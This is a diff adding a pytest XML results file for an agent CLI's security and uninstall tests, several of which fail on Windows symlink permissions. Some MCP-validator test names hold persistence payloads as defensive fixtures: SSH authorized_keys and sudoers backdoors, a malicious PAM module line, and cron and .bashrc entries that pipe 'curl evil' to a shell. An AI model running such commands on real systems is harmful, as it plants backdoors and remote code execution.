@@ -1,0 +1,202 @@
+<?xml version="1.0" encoding="utf-8"?><testsuites name="pytest tests"><testsuite name="pytest" errors="0" failures="7" skipped="0" tests="57" time="17.624" timestamp="2026-08-08T00:35:47.470828+08:00" hostname="DESKTOP-57EO414"><testcase classname="tests.acp.test_permissions.TestApprovalBridge" name="test_bridge_schedules_request_on_the_given_loop" time="0.049" /><testcase classname="tests.acp.test_permissions.TestApprovalBridge" name="test_tool_call_ids_are_unique" time="0.014" /><testcase classname="tests.acp.test_permissions.TestApprovalBridge" name="test_prompt_path_keeps_session_option_when_permanent_disabled" time="0.018" /><testcase classname="tests.acp.test_permissions.TestApprovalBridge" name="test_reject_always_outcome_denies_without_changing_policy" time="0.017" /><testcase classname="tests.acp.test_permissions.TestApprovalBridge" name="test_allow_always_maps_correctly" time="0.017" /><testcase classname="tests.acp.test_permissions.TestApprovalBridge" name="test_denied_and_unknown_outcomes_deny" time="0.016" /><testcase classname="tests.acp.test_permissions.TestApprovalBridge" name="test_timeout_returns_deny_and_cancels_future" time="0.013" /><testcase classname="tests.acp.test_permissions.TestApprovalBridge" name="test_none_response_returns_deny" time="0.013" /><testcase classname="tests.acp.test_permissions.TestSchedulerFailure" name="test_scheduler_failure_closes_permission_coroutine" time="0.040" /><testcase classname="tests.cli.test_worktree_security.TestWorktreeIncludeSecurity" name="test_rejects_parent_directory_file_traversal" time="0.973" /><testcase classname="tests.cli.test_worktree_security.TestWorktreeIncludeSecurity" name="test_rejects_parent_directory_directory_traversal" time="0.509" /><testcase classname="tests.cli.test_worktree_security.TestWorktreeIncludeSecurity" name="test_rejects_symlink_that_resolves_outside_repo" time="0.203"><failure message="OSError: [WinError 1314] 用戶端沒有這項特殊權限。: 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_rejects_symlink_that_reso0\\linked-secret.txt' -&gt; 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_rejects_symlink_that_reso0\\test-repo\\leak.txt'">self = &lt;tests.cli.test_worktree_security.TestWorktreeIncludeSecurity object at 0x000001C33BDDC1D0&gt;
+git_repo = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_rejects_symlink_that_reso0/test-repo')
+
+    def test_rejects_symlink_that_resolves_outside_repo(self, git_repo):
+        import cli as cli_mod
+    
+        outside_file = git_repo.parent / "linked-secret.txt"
+        outside_file.write_text("LINKED SECRET")
+&gt;       (git_repo / "leak.txt").symlink_to(outside_file)
+
+tests\cli\test_worktree_security.py:84: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+
+self = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_rejects_symlink_that_reso0/test-repo/leak.txt')
+target = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_rejects_symlink_that_reso0/linked-secret.txt')
+target_is_directory = False
+
+    def symlink_to(self, target, target_is_directory=False):
+        """
+        Make this path a symlink pointing to the target path.
+        Note the order of arguments (link, target) is the reverse of os.symlink.
+        """
+        if not hasattr(os, "symlink"):
+            raise NotImplementedError("os.symlink() not available on this system")
+&gt;       os.symlink(target, self, target_is_directory)
+E       OSError: [WinError 1314] 用戶端沒有這項特殊權限。: 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_rejects_symlink_that_reso0\\linked-secret.txt' -&gt; 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_rejects_symlink_that_reso0\\test-repo\\leak.txt'
+
+..\..\Programs\Python\Python311\Lib\pathlib.py:1198: OSError</failure></testcase><testcase classname="tests.cli.test_worktree_security.TestWorktreeIncludeSecurity" name="test_allows_valid_file_include" time="0.498" /><testcase classname="tests.cli.test_worktree_security.TestWorktreeIncludeSecurity" name="test_allows_valid_directory_include" time="0.497"><failure message="AssertionError: assert False&#10; +  where False = is_symlink()&#10; +    where is_symlink = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_allows_valid_directory_in0/test-repo/.worktrees/hermes-ad2dc4be/.venv').is_symlink">self = &lt;tests.cli.test_worktree_security.TestWorktreeIncludeSecurity object at 0x000001C33BE99F90&gt;
+git_repo = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_allows_valid_directory_in0/test-repo')
+
+    def test_allows_valid_directory_include(self, git_repo):
+        import cli as cli_mod
+    
+        assets_dir = git_repo / ".venv" / "lib"
+        assets_dir.mkdir(parents=True)
+        (assets_dir / "marker.txt").write_text("venv marker")
+        (git_repo / ".worktreeinclude").write_text(".venv\n")
+    
+        info = None
+        try:
+            info = cli_mod._setup_worktree(str(git_repo))
+            assert info is not None
+    
+            linked_dir = Path(info["path"]) / ".venv"
+&gt;           assert linked_dir.is_symlink()
+E           AssertionError: assert False
+E            +  where False = is_symlink()
+E            +    where is_symlink = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_allows_valid_directory_in0/test-repo/.worktrees/hermes-ad2dc4be/.venv').is_symlink
+
+tests\cli\test_worktree_security.py:127: AssertionError</failure></testcase><testcase classname="tests.hermes_cli.test_mcp_security" name="test_validator_flags_shell_with_network_egress" time="0.034" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_validator_allows_clean_npx_and_benign_shell_pipe" time="0.011" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_validator_flags_ssh_key_persistence_payload" time="0.010" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_validator_flags_persistence_surfaces[echo k &gt;&gt; ~/.ssh/authorized_keys]" time="0.011" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_validator_flags_persistence_surfaces[cp /tmp/x /etc/ssh/sshd_config]" time="0.011" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_validator_flags_persistence_surfaces[echo 'auth sufficient pam_evil.so' &gt;&gt; /etc/pam.d/sshd]" time="0.010" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_validator_flags_persistence_surfaces[echo 'attacker ALL=(ALL) NOPASSWD:ALL' &gt;&gt; /etc/sudoers]" time="0.011" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_validator_flags_persistence_surfaces[echo '* * * * * curl evil' | crontab -]" time="0.011" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_validator_flags_persistence_surfaces[echo 'curl evil | sh' &gt;&gt; ~/.bashrc]" time="0.010" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_ioc_blocklist_rejects_regardless_of_command_shape" time="0.010" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_ioc_blocklist_rejects_attacker_ip" time="0.011" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_save_rejects_hermes_0day_persistence_entry" time="0.537" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_save_mcp_server_rejects_dangerous_entry" time="0.016" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_mcp_add_rejects_dangerous_entry_before_probe" time="0.017" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_probe_rejects_dangerous_entry_before_connect" time="0.011" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_runtime_loader_skips_dangerous_entry" time="0.013" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_explicit_registration_skips_dangerous_entry_before_connect" time="0.013" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_migration_disables_existing_dangerous_entry" time="0.058" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_dashboard_mcp_add_rejects_dangerous_entry" time="0.797" /><testcase classname="tests.hermes_cli.test_mcp_security" name="test_profile_mcp_write_skips_dangerous_entry" time="0.029" /><testcase classname="tests.hermes_cli.test_uninstall_dry_run" name="test_dry_run_prints_plan_without_mutating" time="0.012" /><testcase classname="tests.hermes_cli.test_uninstall_dry_run" name="test_build_uninstall_parser_accepts_dry_run" time="0.013" /><testcase classname="tests.hermes_cli.test_uninstall_node_symlinks" name="test_removes_symlinks_pointing_into_hermes_node" time="0.015"><failure message="OSError: [WinError 1314] 用戶端沒有這項特殊權限。: 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_removes_symlinks_pointing0\\home\\.hermes\\node\\bin\\node' -&gt; 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_removes_symlinks_pointing0\\home\\.local\\bin\\node'">fake_home = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_removes_symlinks_pointing0/home')
+
+    def test_removes_symlinks_pointing_into_hermes_node(fake_home):
+        hermes_home = fake_home / ".hermes"
+        node_bin = _make_hermes_node(hermes_home)
+        local_bin = fake_home / ".local" / "bin"
+    
+        for name in ("node", "npm", "npx"):
+&gt;           (local_bin / name).symlink_to(node_bin / name)
+
+tests\hermes_cli\test_uninstall_node_symlinks.py:44: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+
+self = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_removes_symlinks_pointing0/home/.local/bin/node')
+target = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_removes_symlinks_pointing0/home/.hermes/node/bin/node')
+target_is_directory = False
+
+    def symlink_to(self, target, target_is_directory=False):
+        """
+        Make this path a symlink pointing to the target path.
+        Note the order of arguments (link, target) is the reverse of os.symlink.
+        """
+        if not hasattr(os, "symlink"):
+            raise NotImplementedError("os.symlink() not available on this system")
+&gt;       os.symlink(target, self, target_is_directory)
+E       OSError: [WinError 1314] 用戶端沒有這項特殊權限。: 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_removes_symlinks_pointing0\\home\\.hermes\\node\\bin\\node' -&gt; 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_removes_symlinks_pointing0\\home\\.local\\bin\\node'
+
+..\..\Programs\Python\Python311\Lib\pathlib.py:1198: OSError</failure></testcase><testcase classname="tests.hermes_cli.test_uninstall_node_symlinks" name="test_leaves_unrelated_symlinks_untouched" time="0.016"><failure message="OSError: [WinError 1314] 用戶端沒有這項特殊權限。: 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_leaves_unrelated_symlinks0\\home\\.nvm\\versions\\node\\v20.0.0\\bin\\node' -&gt; 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_leaves_unrelated_symlinks0\\home\\.local\\bin\\node'">fake_home = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_leaves_unrelated_symlinks0/home')
+
+    def test_leaves_unrelated_symlinks_untouched(fake_home):
+        """A node symlink the user repointed at nvm must survive uninstall."""
+        hermes_home = fake_home / ".hermes"
+        _make_hermes_node(hermes_home)
+        local_bin = fake_home / ".local" / "bin"
+    
+        # Simulate nvm's node living elsewhere; user's ~/.local/bin/node -&gt; nvm.
+        nvm_bin = fake_home / ".nvm" / "versions" / "node" / "v20.0.0" / "bin"
+        nvm_bin.mkdir(parents=True)
+        (nvm_bin / "node").write_text("#!/bin/sh\n")
+&gt;       (local_bin / "node").symlink_to(nvm_bin / "node")
+
+tests\hermes_cli\test_uninstall_node_symlinks.py:64: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+
+self = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_leaves_unrelated_symlinks0/home/.local/bin/node')
+target = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_leaves_unrelated_symlinks0/home/.nvm/versions/node/v20.0.0/bin/node')
+target_is_directory = False
+
+    def symlink_to(self, target, target_is_directory=False):
+        """
+        Make this path a symlink pointing to the target path.
+        Note the order of arguments (link, target) is the reverse of os.symlink.
+        """
+        if not hasattr(os, "symlink"):
+            raise NotImplementedError("os.symlink() not available on this system")
+&gt;       os.symlink(target, self, target_is_directory)
+E       OSError: [WinError 1314] 用戶端沒有這項特殊權限。: 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_leaves_unrelated_symlinks0\\home\\.nvm\\versions\\node\\v20.0.0\\bin\\node' -&gt; 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_leaves_unrelated_symlinks0\\home\\.local\\bin\\node'
+
+..\..\Programs\Python\Python311\Lib\pathlib.py:1198: OSError</failure></testcase><testcase classname="tests.hermes_cli.test_uninstall_node_symlinks" name="test_leaves_real_binaries_untouched" time="0.015" /><testcase classname="tests.hermes_cli.test_uninstall_node_symlinks" name="test_handles_missing_local_bin" time="0.015" /><testcase classname="tests.hermes_cli.test_uninstall_node_symlinks" name="test_removes_dangling_symlink_into_hermes_node" time="0.013"><failure message="OSError: [WinError 1314] 用戶端沒有這項特殊權限。: 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_removes_dangling_symlink_0\\home\\.hermes\\node\\bin\\node' -&gt; 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_removes_dangling_symlink_0\\home\\.local\\bin\\node'">fake_home = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_removes_dangling_symlink_0/home')
+
+    def test_removes_dangling_symlink_into_hermes_node(fake_home):
+        """A link into the Hermes node dir is removed even if the target file is
+        already gone (dangling) \u2014 the link still shadows PATH."""
+        hermes_home = fake_home / ".hermes"
+        node_bin = hermes_home / "node" / "bin"
+        node_bin.mkdir(parents=True)
+        local_bin = fake_home / ".local" / "bin"
+    
+        # Create the symlink, then delete the target so it dangles.
+&gt;       (local_bin / "node").symlink_to(node_bin / "node")
+
+tests\hermes_cli\test_uninstall_node_symlinks.py:107: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+
+self = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_removes_dangling_symlink_0/home/.local/bin/node')
+target = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_removes_dangling_symlink_0/home/.hermes/node/bin/node')
+target_is_directory = False
+
+    def symlink_to(self, target, target_is_directory=False):
+        """
+        Make this path a symlink pointing to the target path.
+        Note the order of arguments (link, target) is the reverse of os.symlink.
+        """
+        if not hasattr(os, "symlink"):
+            raise NotImplementedError("os.symlink() not available on this system")
+&gt;       os.symlink(target, self, target_is_directory)
+E       OSError: [WinError 1314] 用戶端沒有這項特殊權限。: 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_removes_dangling_symlink_0\\home\\.hermes\\node\\bin\\node' -&gt; 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_removes_dangling_symlink_0\\home\\.local\\bin\\node'
+
+..\..\Programs\Python\Python311\Lib\pathlib.py:1198: OSError</failure></testcase><testcase classname="tests.hermes_cli.test_uninstall_node_symlinks" name="test_only_some_links_present" time="0.015"><failure message="OSError: [WinError 1314] 用戶端沒有這項特殊權限。: 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_only_some_links_present0\\home\\.hermes\\node\\bin\\npm' -&gt; 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_only_some_links_present0\\home\\.local\\bin\\npm'">fake_home = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_only_some_links_present0/home')
+
+    def test_only_some_links_present(fake_home):
+        """Removes the Hermes links that exist; ignores the ones that don't."""
+        hermes_home = fake_home / ".hermes"
+        node_bin = _make_hermes_node(hermes_home)
+        local_bin = fake_home / ".local" / "bin"
+    
+        # Only npm and npx are Hermes-managed; node is a real user binary.
+&gt;       (local_bin / "npm").symlink_to(node_bin / "npm")
+
+tests\hermes_cli\test_uninstall_node_symlinks.py:123: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+
+self = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_only_some_links_present0/home/.local/bin/npm')
+target = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_only_some_links_present0/home/.hermes/node/bin/npm')
+target_is_directory = False
+
+    def symlink_to(self, target, target_is_directory=False):
+        """
+        Make this path a symlink pointing to the target path.
+        Note the order of arguments (link, target) is the reverse of os.symlink.
+        """
+        if not hasattr(os, "symlink"):
+            raise NotImplementedError("os.symlink() not available on this system")
+&gt;       os.symlink(target, self, target_is_directory)
+E       OSError: [WinError 1314] 用戶端沒有這項特殊權限。: 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_only_some_links_present0\\home\\.hermes\\node\\bin\\npm' -&gt; 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_only_some_links_present0\\home\\.local\\bin\\npm'
+
+..\..\Programs\Python\Python311\Lib\pathlib.py:1198: OSError</failure></testcase><testcase classname="tests.hermes_cli.test_uninstall_node_symlinks" name="test_removes_fhs_symlinks_in_usr_local_bin" time="0.015"><failure message="OSError: [WinError 1314] 用戶端沒有這項特殊權限。: 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_removes_fhs_symlinks_in_u0\\home\\.hermes\\node\\bin\\node' -&gt; 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_removes_fhs_symlinks_in_u0\\usr_local_bin\\node'">fake_home = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_removes_fhs_symlinks_in_u0/home')
+tmp_path = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_removes_fhs_symlinks_in_u0')
+monkeypatch = &lt;_pytest.monkeypatch.MonkeyPatch object at 0x000001C34032EF50&gt;
+
+    def test_removes_fhs_symlinks_in_usr_local_bin(fake_home, tmp_path, monkeypatch):
+        """Root FHS installs place node symlinks in /usr/local/bin.
+    
+        We monkeypatch _node_symlink_candidate_dirs to return a temp dir standing
+        in for /usr/local/bin so the test doesn't need real root privileges.
+        """
+        hermes_home = fake_home / ".hermes"
+        node_bin = _make_hermes_node(hermes_home)
+    
+        # Fake /usr/local/bin as a temp dir with our symlinks.
+        fhs_bin = tmp_path / "usr_local_bin"
+        fhs_bin.mkdir()
+        for name in ("node", "npm", "npx"):
+&gt;           (fhs_bin / name).symlink_to(node_bin / name)
+
+tests\hermes_cli\test_uninstall_node_symlinks.py:148: 
+_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _
+
+self = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_removes_fhs_symlinks_in_u0/usr_local_bin/node')
+target = WindowsPath('C:/Users/user/AppData/Local/Temp/pytest-of-user/pytest-0/test_removes_fhs_symlinks_in_u0/home/.hermes/node/bin/node')
+target_is_directory = False
+
+    def symlink_to(self, target, target_is_directory=False):
+        """
+        Make this path a symlink pointing to the target path.
+        Note the order of arguments (link, target) is the reverse of os.symlink.
+        """
+        if not hasattr(os, "symlink"):
+            raise NotImplementedError("os.symlink() not available on this system")
+&gt;       os.symlink(target, self, target_is_directory)
+E       OSError: [WinError 1314] 用戶端沒有這項特殊權限。: 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_removes_fhs_symlinks_in_u0\\home\\.hermes\\node\\bin\\node' -&gt; 'C:\\Users\\user\\AppData\\Local\\Temp\\pytest-of-user\\pytest-0\\test_removes_fhs_symlinks_in_u0\\usr_local_bin\\node'
+
+..\..\Programs\Python\Python311\Lib\pathlib.py:1198: OSError</failure></testcase><testcase classname="tests.tools.test_skill_view_path_check.TestSkillViewPathBoundaryCheck" name="test_valid_subpath_allowed" time="0.013" /><testcase classname="tests.tools.test_skill_view_path_check.TestSkillViewPathBoundaryCheck" name="test_deeply_nested_subpath_allowed" time="0.013" /><testcase classname="tests.tools.test_skill_view_path_check.TestSkillViewPathBoundaryCheck" name="test_outside_path_blocked" time="0.020" /><testcase classname="tests.tools.test_skill_view_path_check.TestSkillViewPathBoundaryCheck" name="test_sibling_skill_dir_blocked" time="0.021" /><testcase classname="tests.tools.test_skill_view_path_check.TestSkillViewPathBoundaryCheck" name="test_skill_dir_itself_allowed" time="0.014" /><testcase classname="tests.tools.test_skill_view_path_check.TestOldCheckWouldFail" name="test_old_check_false_positive_on_windows" time="0.013" /><testcase classname="tests.tools.test_tts_path_traversal" name="test_output_path_rejects_traversal_escape" time="0.022" /><testcase classname="tests.tools.test_tts_path_traversal" name="test_output_path_rejects_bare_dotdot" time="0.019" /><testcase classname="tests.tools.test_tts_path_traversal" name="test_output_path_absolute_path_passes_guard" time="8.896" /><testcase classname="tests.tools.test_tts_path_traversal" name="test_output_path_relative_no_dotdot_passes_guard" time="0.723" /><testcase classname="tests.run_agent.test_switch_model_rollback" name="test_openai_client_rebuild_failure_rolls_back_to_original_state" time="0.075" /><testcase classname="tests.run_agent.test_switch_model_rollback" name="test_anthropic_client_rebuild_failure_rolls_back_to_original_state" time="0.021" /><testcase classname="tests.run_agent.test_switch_model_rollback" name="test_cross_branch_anthropic_to_openai_rebuild_failure_rolls_back" time="0.026" /><testcase classname="tests.run_agent.test_switch_model_rollback" name="test_successful_switch_still_works_after_rollback_refactor" time="0.047" /></testsuite></testsuites>
